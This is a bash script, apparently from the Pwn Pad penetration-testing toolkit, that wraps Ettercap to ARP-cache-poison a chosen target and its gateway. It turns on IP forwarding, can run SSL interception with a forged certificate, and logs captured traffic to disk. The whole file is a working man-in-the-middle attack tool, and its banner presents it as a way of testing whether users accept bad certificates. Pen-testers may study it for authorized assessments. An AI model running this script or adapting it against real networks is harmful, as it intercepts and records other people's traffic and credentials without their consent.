#!/bin/bash
# Ettercap ARP cache poison script
#set the prompt to the name of the script
PS1=${PS1//@\\h/@ettercap}
clear

#this block controls the features for px_interface_selector
include_monitor=0
include_airbase=0
require_ip=1
message="sniff/poison on"
. /opt/pwnix/pwnpad-scripts/px_functions.sh

f_banner(){
  printf "\nEttercap-NG 0.8.0 ARP Cache Poison Tool\n\n"
  printf "[!] Use on networks you are connected to!\n\n"
}

f_sslfake(){
  printf "\nWould you like to use the Invalid SSL Cert option?\n\n"
  printf "Good for testing user policy to make sure users aren't accepting bad certs!\n\n"
  printf "NOTE: if using SSLstrip with Ettercap this is unnecessary\n\n"
  printf "1. Yes\n"
  printf "2. No\n\n"
  sslfakecert=$(f_one_or_two)
}

f_logging(){
  clear
  printf "\nWould you like to log data?\n\n"
  printf "Captures saved to /opt/pwnix/captures/ettercap/\n\n"
  printf "1. Yes\n"
  printf "2. No\n\n"

  logchoice=$(f_one_or_two)
}

f_generate_filename(){
  printf "/opt/pwnix/captures/ettercap/ettercap$(date +%F-%H%M)\n"
}

f_run(){
  printf 1 > /proc/sys/net/ipv4/ip_forward

  filename=$(f_generate_filename)

  clear
  printf "\n"
  read -p "Enter target IP to ARP cache poison: " target1
  printf "\n"

  clear
  printf "\n"
  read -p "Enter target IP of gateway/router: " gw
  printf "\n"

  #ettercap fails if the interface is down
  ip link set $interface up
  
  trap f_hangup SIGHUP

   # Check for Kali1 version for target syntax change...
  dpkg --list ettercap-common | grep -q 1:0.8.2-2~kali1
  if [ $? -eq 0 ]; then
    syntax=""
  else
    syntax="/"
  fi

  if [ $logchoice -eq 1 ]; then
    log="-l ${filename}"
  else
    log=""
  fi

  if [ $sslfakecert -eq 1 ]; then
    ssl=""
  else
    ssl="--nosslmitm"
  fi

  ettercap -i $interface -T ${ssl} -q ${log} -M arp:remote ${syntax}/$gw/ ${syntax}/$target1/
}

f_hangup(){
  pkill -f 'ettercap -i ${interface} -T ${ssl} -q ${log} -M arp:remote ${syntax}/${gw}/ ${syntax}/${target1}/'
  exit 1
}

f_banner
f_interface
f_sslfake
f_logging
f_run
